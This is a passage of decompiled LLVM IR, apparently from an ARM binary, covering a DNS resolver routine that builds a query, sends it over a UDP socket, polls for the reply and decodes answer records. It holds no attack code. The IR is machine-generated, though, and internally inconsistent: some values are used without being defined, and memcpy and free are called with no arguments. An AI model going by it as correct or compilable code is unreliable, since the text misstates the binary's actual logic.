  store i32 %v3_18b20, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_18b98 = load i32, i32* @sl, align 4
  store i32 %v0_18b98, i32* %r1.global-to-local, align 4
  store i32 %v3_18b20, i32* %stack_var_-192, align 4
  %v6_18bac = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_18b98, i32 512, i32 %v3_18b20, i32 %v3_18b20)
  store i32 %v6_18bac, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18bb0 = icmp slt i32 %v6_18bac, 0
  br i1 %v1_18bb0, label %dec_label_pc_1906c, label %dec_label_pc_18bb8

dec_label_pc_18bb8:                               ; preds = %bb218
  store i32 %v0_18924, i32* @ip, align 4
  store i32 %v1_1896c, i32* @r5, align 4
  %v0_18bc8 = load i32, i32* @sl, align 4
  %v2_18bc8 = add i32 %v0_18bc8, %v6_18bac
  store i32 %v2_18bc8, i32* %r1.global-to-local, align 4
  %v1_18bcc = sub i32 512, %v6_18bac
  store i32 %v1_1896c, i32* %stack_var_-60, align 4
  store i32 %v0_18924, i32* %stack_var_-56, align 4
  %v4_18bd8 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_18bc8, i32 %v1_18bcc)
  store i32 %v4_18bd8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18bdc = icmp slt i32 %v4_18bd8, 0
  br i1 %v1_18bdc, label %dec_label_pc_1906c, label %dec_label_pc_18be4

dec_label_pc_18be4:                               ; preds = %dec_label_pc_18bb8
  %v3_18be8 = load i16, i16* %stack_var_-104, align 2
  %v4_18be8 = sext i16 %v3_18be8 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_18bf4 = call i32 @socket(i32 %v4_18be8, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18bf8 = icmp slt i32 %v3_18bf4, 0
  br i1 %v1_18bf8, label %dec_label_pc_19044, label %dec_label_pc_18c04

dec_label_pc_18c04:                               ; preds = %dec_label_pc_18be4
  store i32 %v2_18b40, i32* %r1.global-to-local, align 4
  %v3_18c0c = call i32 @__libc_connect(i32 %v3_18bf4, i32 %v2_18b40, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18c10 = icmp slt i32 %v3_18c0c, 0
  br i1 %v1_18c10, label %dec_label_pc_19044, label %dec_label_pc_18c18

dec_label_pc_18c18:                               ; preds = %dec_label_pc_18c04
  %v0_18c18 = load i32, i32* @r5, align 4
  %v1_18c18 = load i32, i32* @r4, align 4
  %v2_18c18 = add i32 %v1_18c18, %v0_18c18
  %v0_18c1c = load i32, i32* @r7, align 4
  store i32 %v0_18c1c, i32* %r3.global-to-local, align 4
  %v0_18c24 = load i32, i32* @sl, align 4
  store i32 %v0_18c24, i32* %r1.global-to-local, align 4
  %v4_18c28 = call i32 @__libc_send(i32 %v3_18bf4, i32 %v0_18c24, i32 %v2_18c18, i32 %v0_18c1c)
  store i32 1122, i32* %r3.global-to-local, align 4
  %v0_18c30 = load i32, i32* @r8, align 4
  %v2_18c30 = add i32 %v0_18c30, 1122
  %v3_18c30 = inttoptr i32 %v2_18c30 to i8*
  %v4_18c30 = load i8, i8* %v3_18c30, align 1
  %v6_18c30 = zext i8 %v4_18c30 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_18c38 = mul nuw nsw i32 %v6_18c30, 1000
  store i32 %v2_18c38, i32* @r4, align 4
  store i32 %v2_18c3c, i32* @r5, align 4
  br label %dec_label_pc_18c40

dec_label_pc_18c40:                               ; preds = %thread-pre-split, %dec_label_pc_18c18
  %v0_18c4c = phi i32 [ %v1_18c8c, %thread-pre-split ], [ %v2_18c38, %dec_label_pc_18c18 ]
  store i32 %v3_18bf4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_18c48, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_18bf4, i32* %stack_var_-48, align 4
  %v7_18c60 = call i32 @__GI_poll(i32 %v2_18c3c, i32 1, i32 %v0_18c4c, i32 %v3_18bf4, i32 %v3_18bf4, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_18c68 = load i32, i32* @sl, align 4
  store i32 %v0_18c68, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_18c60, 1
  br i1 %tmp219, label %dec_label_pc_19044, label %dec_label_pc_18c7c

dec_label_pc_18c7c:                               ; preds = %dec_label_pc_18c40
  %v5_18c7c = call i32 @__libc_recv(i32 %v3_18bf4, i32 %v0_18c68, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_18c80 = icmp ugt i32 %v5_18c7c, 10
  store i1 %v2_18c80, i1* %cpsr_c.global-to-local, align 1
  %v8_18c88 = icmp sgt i32 %v5_18c7c, 11
  br i1 %v8_18c88, label %dec_label_pc_18cb4, label %dec_label_pc_18c8c

dec_label_pc_18c8c:                               ; preds = %dec_label_pc_18cb4, %dec_label_pc_18cd0, %dec_label_pc_18c7c
  %v0_18c8c = load i32, i32* @r4, align 4
  %v1_18c8c = add i32 %v0_18c8c, -1000
  store i32 %v1_18c8c, i32* @r4, align 4
  %v7_18c8c = icmp eq i32 %v0_18c8c, 1000
  %tmp283 = zext i1 %v7_18c8c to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18c9c = icmp slt i32 %v5_18c7c, 0
  br i1 %v1_18c9c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_18c8c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_19044

thread-pre-split:                                 ; preds = %dec_label_pc_18c8c
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_18c8c, label %dec_label_pc_19044, label %dec_label_pc_18c40

dec_label_pc_18cb4:                               ; preds = %dec_label_pc_18c7c
  store i32 %v2_18b68, i32* %r1.global-to-local, align 4
  %v0_18cb8 = load i32, i32* @sl, align 4
  %v2_18cbc = inttoptr i32 %v0_18cb8 to i8*
  %v3_18cbc = call i32 @__decode_header(i8* %v2_18cbc, i32 %v2_18b68)
  %v3_18cc0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_18cc0, i32* %r3.global-to-local, align 4
  store i32 %v3_18b20, i32* %r1.global-to-local, align 4
  %v3_18cc8 = icmp uge i32 %v3_18cc0, %v3_18b20
  store i1 %v3_18cc8, i1* %cpsr_c.global-to-local, align 1
  %v9_18cc8 = icmp eq i32 %v3_18cc0, %v3_18b20
  br i1 %v9_18cc8, label %dec_label_pc_18cd0, label %dec_label_pc_18c8c

dec_label_pc_18cd0:                               ; preds = %dec_label_pc_18cb4
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18cd4, label %dec_label_pc_18c8c, label %dec_label_pc_18cdc

dec_label_pc_18cdc:                               ; preds = %dec_label_pc_18cd0
  store i32 %v1_18ce0, i32* %r3.global-to-local, align 4
  store i1 %v2_18ce4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_18ce0.cmp, label %dec_label_pc_18d18, label %dec_label_pc_18cec

dec_label_pc_18cec:                               ; preds = %dec_label_pc_18cdc
  store i1 %v2_18cf0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_18cf0, label %dec_label_pc_18d0c, label %dec_label_pc_18cf8

dec_label_pc_18cf8:                               ; preds = %dec_label_pc_18cec
  store i32 %v4_18a64, i32* @r5, align 4
  %v1_18cfc = add i32 %v4_18a64, -1
  store i32 %v1_18cfc, i32* %r3.global-to-local, align 4
  %v0_18d00 = load i32, i32* @sb, align 4
  %v3_18d00 = icmp uge i32 %v0_18d00, %v1_18cfc
  store i1 %v3_18d00, i1* %cpsr_c.global-to-local, align 1
  %v5_18d04 = icmp slt i32 %v0_18d00, %v1_18cfc
  br i1 %v5_18d04, label %.thread7, label %dec_label_pc_18d0c

.thread7:                                         ; preds = %dec_label_pc_18cf8
  %v7_18d04 = add i32 %v0_18d00, 1
  br label %dec_label_pc_19054

dec_label_pc_18d0c:                               ; preds = %dec_label_pc_18cf8, %dec_label_pc_18cec
  %v0_18d0c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18d40

dec_label_pc_18d18:                               ; preds = %dec_label_pc_18cdc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18d18, label %dec_label_pc_18d20, label %dec_label_pc_19044

dec_label_pc_18d20:                               ; preds = %dec_label_pc_18d18
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_18d38, label %dec_label_pc_18d48

dec_label_pc_18d38:                               ; preds = %dec_label_pc_18d20
  %v0_18d38 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18d40

dec_label_pc_18d40:                               ; preds = %dec_label_pc_18d0c, %dec_label_pc_18d38
  %storemerge2 = phi i32 [ %v0_18d38, %dec_label_pc_18d38 ], [ %v0_18d0c, %dec_label_pc_18d0c ]
  %storemerge = phi i32 [ 4, %dec_label_pc_18d38 ], [ 1, %dec_label_pc_18d0c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_18d40 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_18d40, align 4
  br label %dec_label_pc_1908c

dec_label_pc_18d48:                               ; preds = %dec_label_pc_18d20
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_18d4c.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_18d4c = add i32 %v0_18d4c.pre, 12
  store i32 %v2_18d4c, i32* @r4, align 4
  %v3_18d4c = icmp ugt i32 %v0_18d4c.pre, -13
  store i1 %v3_18d4c, i1* %cpsr_c.global-to-local, align 1
  %v9_18d4c = icmp eq i32 %v2_18d4c, 0
  br i1 %v9_18d4c, label %dec_label_pc_19044, label %dec_label_pc_18d54

dec_label_pc_18d54:                               ; preds = %dec_label_pc_18d48
  %v2_18d58 = add i32 %v5_18c7c, -12
  store i32 %v2_18d58, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_18d58, 1
  br i1 %tmp223, label %dec_label_pc_19044, label %dec_label_pc_18d68

dec_label_pc_18d60thread-pre-split:               ; preds = %dec_label_pc_18d84
  %v2_18d9015 = add i32 %v2_18d74, -1
  store i32 %v2_18d9015, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_18d9015, 1
  br i1 %tmp224, label %dec_label_pc_19044, label %dec_label_pc_18d68

dec_label_pc_18d68:                               ; preds = %dec_label_pc_18d54, %dec_label_pc_18d60thread-pre-split
  %v1_18d8c = phi i32 [ %v2_18d9015, %dec_label_pc_18d60thread-pre-split ], [ %v2_18d58, %dec_label_pc_18d54 ]
  %v0_18d68 = phi i32 [ %v2_18d7c, %dec_label_pc_18d60thread-pre-split ], [ %v2_18d4c, %dec_label_pc_18d54 ]
  %v1_18d68 = inttoptr i32 %v0_18d68 to i8*
  %v2_18d68 = load i8, i8* %v1_18d68, align 1
  %v3_18d68 = zext i8 %v2_18d68 to i32
  store i32 %v3_18d68, i32* %r3.global-to-local, align 4
  %v5_18d68 = add i32 %v0_18d68, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18d6c = icmp eq i8 %v2_18d68, 0
  %v2_18d74 = sub i32 %v1_18d8c, %v3_18d68
  store i32 %v2_18d74, i32* @lr, align 4
  %v1_18d78 = and i32 %v3_18d68, 192
  store i32 %v1_18d78, i32* @ip, align 4
  %v2_18d7c = add i32 %v3_18d68, %v5_18d68
  br i1 %v2_18d6c, label %dec_label_pc_18d98, label %dec_label_pc_18d84

dec_label_pc_18d84:                               ; preds = %dec_label_pc_18d68
  %v2_18d84 = icmp eq i32 %v1_18d78, 192
  store i1 %v2_18d84, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18d84, label %.thread9, label %dec_label_pc_18d60thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_18d84
  %v2_18d88 = add i32 %v0_18d68, 2
  %v2_18d8c = add i32 %v1_18d8c, -2
  store i32 %v2_18d8c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d98

dec_label_pc_18d98:                               ; preds = %dec_label_pc_18d68, %.thread9
  %v1_18da4 = phi i32 [ %v2_18d88, %.thread9 ], [ %v5_18d68, %dec_label_pc_18d68 ]
  %v0_18d98 = phi i32 [ %v2_18d8c, %.thread9 ], [ %v1_18d8c, %dec_label_pc_18d68 ]
  %v1_18d98 = add i32 %v0_18d98, -3
  %v2_18d98 = icmp ugt i32 %v0_18d98, 2
  store i1 %v2_18d98, i1* %cpsr_c.global-to-local, align 1
  %v3_18d98 = sub i32 2, %v0_18d98
  %v4_18d98 = and i32 %v3_18d98, %v0_18d98
  %v5_18d98 = icmp slt i32 %v4_18d98, 0
  %v6_18d98 = icmp slt i32 %v1_18d98, 0
  %v7_18d98 = icmp eq i32 %v0_18d98, 3
  %v3_18d9c = xor i1 %v6_18d98, %v5_18d98
  %v4_18d9c = or i1 %v7_18d98, %v3_18d9c
  br i1 %v4_18d9c, label %dec_label_pc_19044, label %dec_label_pc_18da0

dec_label_pc_18da0:                               ; preds = %dec_label_pc_18d98
  %v1_18da0 = sub i32 -8, %v0_18d4c.pre
  %v2_18da4 = add i32 %v1_18da4, %v1_18da0
  store i32 %v2_18da4, i32* %r3.global-to-local, align 4
  %v3_18da4 = icmp ult i32 %v2_18da4, %v1_18da0
  store i1 %v3_18da4, i1* %cpsr_c.global-to-local, align 1
  %v8_18da4 = icmp slt i32 %v2_18da4, 0
  br i1 %v8_18da4, label %dec_label_pc_19044, label %dec_label_pc_18dc8

dec_label_pc_18dc8:                               ; preds = %dec_label_pc_18da0
  %v2_18db0 = add i32 %v2_18da4, 12
  store i32 %v2_18db0, i32* %r1.global-to-local, align 4
  store i32 %v2_18dd0, i32* @r5, align 4
  store i32 %v2_18dd4, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1901856, label %dec_label_pc_18dec, label %dec_label_pc_1901c

dec_label_pc_18dec:                               ; preds = %dec_label_pc_18dc8, %dec_label_pc_18ff4.dec_label_pc_18dec_crit_edge
  %v0_18df0 = phi i32 [ %v0_18df0.pre, %dec_label_pc_18ff4.dec_label_pc_18dec_crit_edge ], [ %v0_18d4c.pre, %dec_label_pc_18dc8 ]
  %stack_var_-460.364 = phi i32 [ %v2_18ffc, %dec_label_pc_18ff4.dec_label_pc_18dec_crit_edge ], [ %v2_18db0, %dec_label_pc_18dc8 ]
  %stack_var_-452.061 = phi i32 [ %v1_19000, %dec_label_pc_18ff4.dec_label_pc_18dec_crit_edge ], [ 0, %dec_label_pc_18dc8 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_18ff4.dec_label_pc_18dec_crit_edge ], [ 1, %dec_label_pc_18dc8 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_18dd0, i32* %r3.global-to-local, align 4
  %v5_18e04 = call i32 @__decode_dotted(i32 %v0_18df0, i32 %stack_var_-460.364, i32 %v5_18c7c, i32 %v2_18dd0, i32 256)
  store i32 %v5_18e04, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18e08 = icmp slt i32 %v5_18e04, 0
  br i1 %v1_18e08, label %dec_label_pc_18ed8, label %dec_label_pc_18e10

dec_label_pc_18e10:                               ; preds = %dec_label_pc_18dec
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_18e18 = add i32 %v5_18e04, 10
  store i32 %v1_18e18, i32* @sb, align 4
  %v2_18e1c = sub i32 %v5_18c7c, %stack_var_-460.364
  %v2_18e20 = sub i32 %v2_18e1c, %v1_18e18
  store i32 %v2_18e20, i32* %r3.global-to-local, align 4
  %v3_18e20 = icmp uge i32 %v2_18e1c, %v1_18e18
  store i1 %v3_18e20, i1* %cpsr_c.global-to-local, align 1
  %v8_18e20 = icmp slt i32 %v2_18e20, 0
  br i1 %v8_18e20, label %dec_label_pc_18ed0.thread, label %dec_label_pc_18e30

dec_label_pc_18ed0.thread:                        ; preds = %dec_label_pc_18e10
  store i32 %v2_18e20, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_18ed8

dec_label_pc_18e30:                               ; preds = %dec_label_pc_18e10
  %v2_18e34 = call i32 @__GI_strdup(i8* %v1_18e34)
  %v0_18e3c = load i32, i32* @r4, align 4
  %v2_18e3c = add i32 %v0_18e3c, %stack_var_-460.364
  %v0_18e40 = load i32, i32* @sl, align 4
  %v2_18e40 = add i32 %v0_18e40, %v2_18e3c
  store i32 %v2_18e40, i32* %r1.global-to-local, align 4
  %v1_18e44 = add i32 %v2_18e40, 2
  store i32 %v1_18e44, i32* %ip.global-to-local, align 4
  %v1_18e48 = add i32 %v2_18e40, 4
  store i32 %v1_18e48, i32* %r3.global-to-local, align 4
  %v1_18e4c = add i32 %v2_18e40, 5
  %v2_18e4c = inttoptr i32 %v1_18e4c to i8*
  %v3_18e4c = load i8, i8* %v2_18e4c, align 1
  %v4_18e4c = zext i8 %v3_18e4c to i32
  %v1_18e54 = add i32 %v2_18e40, 8
  %v2_18e54 = inttoptr i32 %v1_18e54 to i8*
  %v3_18e54 = load i8, i8* %v2_18e54, align 1
  %v4_18e54 = zext i8 %v3_18e54 to i32
  %v1_18e60 = add i32 %v2_18e40, 6
  %v2_18e60 = inttoptr i32 %v1_18e60 to i8*
  %v3_18e60 = load i8, i8* %v2_18e60, align 1
  %v4_18e60 = zext i8 %v3_18e60 to i32
  store i32 %v4_18e60, i32* %r3.global-to-local, align 4
  %v1_18e64 = add i32 %v2_18e40, 9
  %v2_18e64 = inttoptr i32 %v1_18e64 to i8*
  %v3_18e64 = load i8, i8* %v2_18e64, align 1
  %v4_18e64 = zext i8 %v3_18e64 to i32
  %v3_18e6c = inttoptr i32 %v2_18e40 to i8*
  %v4_18e6c = load i8, i8* %v3_18e6c, align 1
  %v6_18e6c = zext i8 %v4_18e6c to i32
  %v1_18e70 = add i32 %v2_18e40, 3
  %v2_18e70 = inttoptr i32 %v1_18e70 to i8*
  %v3_18e70 = load i8, i8* %v2_18e70, align 1
  %v4_18e70 = zext i8 %v3_18e70 to i32
  store i32 %v4_18e70, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_18e78 = inttoptr i32 %v1_18e44 to i8*
  %v3_18e78 = load i8, i8* %v2_18e78, align 1
  %v4_18e78 = zext i8 %v3_18e78 to i32
  store i32 %v4_18e78, i32* %ip.global-to-local, align 4
  %v1_18e7c = add i32 %v2_18e40, 1
  %v2_18e7c = inttoptr i32 %v1_18e7c to i8*
  %v3_18e7c = load i8, i8* %v2_18e7c, align 1
  %v4_18e7c = zext i8 %v3_18e7c to i32
  %v4_18e80 = mul nuw nsw i32 %v4_18e54, 256
  %v5_18e80 = or i32 %v4_18e64, %v4_18e80
  store i32 %v5_18e80, i32* @r6, align 4
  store i32 %v4_18e4c, i32* @r7, align 4
  %v4_18e88 = mul nuw nsw i32 %v6_18e6c, 256
  %v5_18e88 = or i32 %v4_18e7c, %v4_18e88
  store i32 %v5_18e88, i32* @lr, align 4
  %v4_18e8c = mul nuw nsw i32 %v4_18e78, 256
  %v5_18e8c = or i32 %v4_18e8c, %v4_18e70
  store i32 %v5_18e8c, i32* %r3.global-to-local, align 4
  store i32 %v2_18e20, i32* @r5, align 4
  store i32 %v4_18e60, i32* @ip, align 4
  %v1_18ea0 = add i32 %v2_18e40, 10
  store i32 %v1_18ea0, i32* %r1.global-to-local, align 4
  %v1_18ea4 = add i32 %v2_18e3c, 10
  store i32 %v1_18ea4, i32* @r4, align 4
  %v2_18ea8 = sub i32 %v2_18e20, %v5_18e80
  %v3_18ea8 = icmp uge i32 %v2_18e20, %v5_18e80
  store i1 %v3_18ea8, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_18ea8
  %v6_18ea8 = and i32 %v2_18e20, %tmp226
  %v7_18ea8 = icmp slt i32 %v6_18ea8, 0
  %v8_18ea8 = icmp slt i32 %v2_18ea8, 0
  store i32 %v2_18e34, i32* %stack_var_-144, align 4
  %v2_18ec8 = xor i1 %v8_18ea8, %v7_18ea8
  br i1 %v2_18ec8, label %dec_label_pc_18ed8, label %dec_label_pc_18ed0

dec_label_pc_18ed0:                               ; preds = %dec_label_pc_18e30
  %v0_18ecc = load i32, i32* @sb, align 4
  %v2_18ecc = add i32 %v0_18ecc, %v5_18e80
  store i32 %v2_18ecc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18ed0 = icmp slt i32 %v2_18ecc, 0
  br i1 %v1_18ed0, label %dec_label_pc_18ed8, label %dec_label_pc_18ef4

dec_label_pc_18ed8:                               ; preds = %dec_label_pc_18ed0, %dec_label_pc_18e30, %dec_label_pc_18dec, %dec_label_pc_18ed0.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18edc = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_18edc, label %dec_label_pc_19044, label %dec_label_pc_18ee4

dec_label_pc_18ee4:                               ; preds = %dec_label_pc_18ed8
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18ee8, label %dec_label_pc_19044, label %dec_label_pc_1901c

dec_label_pc_18ef4:                               ; preds = %dec_label_pc_18ed0
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18ef8 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_18ef8, label %dec_label_pc_18f9c, label %dec_label_pc_18f00

dec_label_pc_18f00:                               ; preds = %dec_label_pc_18ef4
  %v0_18f00 = load i32, i32* @fp, align 4
  %v1_18f00 = add i32 %v0_18f00, 28
  store i32 %v1_18f00, i32* %r3.global-to-local, align 4
  %v1_18f04 = inttoptr i32 %v1_18f00 to i32*
  %v2_18f04 = load i32, i32* %v1_18f04, align 4
  store i32 %v2_18f04, i32* @r3, align 4
  %v3_18f04 = add i32 %v0_18f00, 32
  %v4_18f04 = inttoptr i32 %v3_18f04 to i32*
  %v5_18f04 = load i32, i32* %v4_18f04, align 4
  store i32 %v5_18f04, i32* @ip, align 4
  %v6_18f04 = add i32 %v0_18f00, 36
  %v7_18f04 = inttoptr i32 %v6_18f04 to i32*
  %v8_18f04 = load i32, i32* %v7_18f04, align 4
  store i32 %v8_18f04, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_18f00, i32* @r0, align 4
  store i32 %v2_18dd4, i32* @r1, align 4
  %v0_18f20 = call i32 @memcpy()
  %v0_18f24 = load i32, i32* @fp, align 4
  %v1_18f24 = add i32 %v0_18f24, 4
  %v2_18f24 = inttoptr i32 %v1_18f24 to i32*
  %v3_18f24 = load i32, i32* %v2_18f24, align 4
  %v2_18f28 = icmp ugt i32 %v3_18f24, 23
  store i1 %v2_18f28, i1* %cpsr_c.global-to-local, align 1
  %v7_18f28 = icmp eq i32 %v3_18f24, 24
  br i1 %v7_18f28, label %dec_label_pc_18f4c, label %dec_label_pc_18f30

dec_label_pc_18f30:                               ; preds = %dec_label_pc_18f00
  %v1_18f30 = add i32 %v0_18f24, 28
  %v2_18f30 = inttoptr i32 %v1_18f30 to i32*
  %v3_18f30 = load i32, i32* %v2_18f30, align 4
  store i32 %v3_18f30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18f34 = icmp eq i32 %v3_18f30, 0
  br i1 %v2_18f34, label %dec_label_pc_1901c, label %dec_label_pc_18f3c

dec_label_pc_18f3c:                               ; preds = %dec_label_pc_18f30
  store i1 %v2_18f40, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_18f40, label %dec_label_pc_18f4c, label %bb227

bb227:                                            ; preds = %dec_label_pc_18f3c
  store i1 %v3_18f44, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_18f44, label %dec_label_pc_18f4c, label %dec_label_pc_1901c

dec_label_pc_18f4c:                               ; preds = %dec_label_pc_18f3c, %bb227, %dec_label_pc_18f00
  store i32 %v0_18924, i32* %r1.global-to-local, align 4
  %v3_18f50 = icmp uge i32 %v3_18f24, %v0_18924
  store i1 %v3_18f50, i1* %cpsr_c.global-to-local, align 1
  %v9_18f50 = icmp eq i32 %v3_18f24, %v0_18924
  br i1 %v9_18f50, label %dec_label_pc_18f60, label %bb228

bb228:                                            ; preds = %dec_label_pc_18f4c
  br label %dec_label_pc_18ff4

dec_label_pc_18f60:                               ; preds = %dec_label_pc_18f4c
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_18f68 = add i32 %v0_18f24, 16
  %v2_18f68 = inttoptr i32 %v1_18f68 to i32*
  %v3_18f68 = load i32, i32* %v2_18f68, align 4
  %v2_18f6c = sub i32 %tmp159, %stack_var_-452.061
  %v1_18f70 = add i32 %v2_18f6c, -1
  store i32 %v1_18f70, i32* %r3.global-to-local, align 4
  %v1_18f74 = add i32 %v3_18f68, 4
  %v2_18f78 = mul i32 %v1_18f74, %v1_18f70
  store i32 %v2_18f78, i32* %r1.global-to-local, align 4
  %v1_18f7c = add i32 %v0_18f24, 32
  %v2_18f7c = inttoptr i32 %v1_18f7c to i32*
  %v3_18f7c = load i32, i32* %v2_18f7c, align 4
  %v3_18f80 = icmp uge i32 %v2_18f78, %v3_18f7c
  store i1 %v3_18f80, i1* %cpsr_c.global-to-local, align 1
  %v2_18f84 = add i32 %v0_18f24, 36
  %v3_18f84 = inttoptr i32 %v2_18f84 to i32*
  store i32 %v1_18f70, i32* %v3_18f84, align 4
  %tmp286 = icmp ugt i32 %v2_18f78, %v3_18f7c
  br i1 %tmp286, label %dec_label_pc_1901c, label %dec_label_pc_18f8c

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f60
  store i32 0, i32* @r7, align 4
  %v1_18f94 = load i32, i32* @fp, align 4
  %v2_18f94 = add i32 %v1_18f94, 36
  %v3_18f94 = inttoptr i32 %v2_18f94 to i32*
  store i32 0, i32* %v3_18f94, align 4
  br label %dec_label_pc_18ff4

dec_label_pc_18f9c:                               ; preds = %dec_label_pc_18ef4
  store i32 %v2_18e34, i32* @r0, align 4
  %v0_18fa0 = call i32 @free()
  store i32 %v5_18e88, i32* %r3.global-to-local, align 4
  store i32 %v0_18924, i32* @ip, align 4
  %v3_18fac = icmp uge i32 %v5_18e88, %v0_18924
  store i1 %v3_18fac, i1* %cpsr_c.global-to-local, align 1
  %v9_18fac = icmp eq i32 %v5_18e88, %v0_18924
  br i1 %v9_18fac, label %dec_label_pc_18fb4, label %dec_label_pc_18ff4

dec_label_pc_18fb4:                               ; preds = %dec_label_pc_18f9c
  %v0_18fb4 = load i32, i32* @fp, align 4
  %v1_18fb4 = add i32 %v0_18fb4, 16
  %v2_18fb4 = inttoptr i32 %v1_18fb4 to i32*
  %v3_18fb4 = load i32, i32* %v2_18fb4, align 4
  store i32 %v3_18fb4, i32* %r1.global-to-local, align 4
  store i32 %v5_18e80, i32* %r3.global-to-local, align 4
  %v3_18fbc = icmp uge i32 %v3_18fb4, %v5_18e80
  store i1 %v3_18fbc, i1* %cpsr_c.global-to-local, align 1
  %v9_18fbc = icmp eq i32 %v3_18fb4, %v5_18e80
  br i1 %v9_18fbc, label %dec_label_pc_18fd0, label %dec_label_pc_18fc4

dec_label_pc_18fc4:                               ; preds = %dec_label_pc_18fb4
  %v1_18fc4 = inttoptr i32 %v0_18fb4 to i32*
  %v2_18fc4 = load i32, i32* %v1_18fc4, align 4
  store i32 %v2_18fc4, i32* @r0, align 4
  %v0_18fc8 = call i32 @free()
  br label %dec_label_pc_19044

dec_label_pc_18fd0:                               ; preds = %dec_label_pc_18fb4
  %v1_18fd0 = add i32 %v0_18fb4, 36
  %v2_18fd0 = inttoptr i32 %v1_18fd0 to i32*
  %v3_18fd0 = load i32, i32* %v2_18fd0, align 4
  %v1_18fd4 = add i32 %v0_18fb4, 28
  %v2_18fd4 = inttoptr i32 %v1_18fd4 to i32*
  %v3_18fd4 = load i32, i32* %v2_18fd4, align 4
  store i32 %v3_18fd4, i32* @r3, align 4
  %v3_18fd8 = mul i32 %v3_18fd0, %v5_18e80
  %v4_18fd8 = add i32 %v3_18fd4, %v3_18fd8
  store i32 %v4_18fd8, i32* @r0, align 4
  store i32 %v5_18e80, i32* @r2, align 4
  store i32 %v1_18ea0, i32* @r1, align 4
  %v0_18fe4 = call i32 @memcpy()
  %v0_18fe8 = load i32, i32* @fp, align 4
  %v1_18fe8 = add i32 %v0_18fe8, 36
  %v2_18fe8 = inttoptr i32 %v1_18fe8 to i32*
  %v3_18fe8 = load i32, i32* %v2_18fe8, align 4
  %v1_18fec = add i32 %v3_18fe8, 1
  store i32 %v1_18fec, i32* %r3.global-to-local, align 4
  store i32 %v1_18fec, i32* %v2_18fe8, align 4
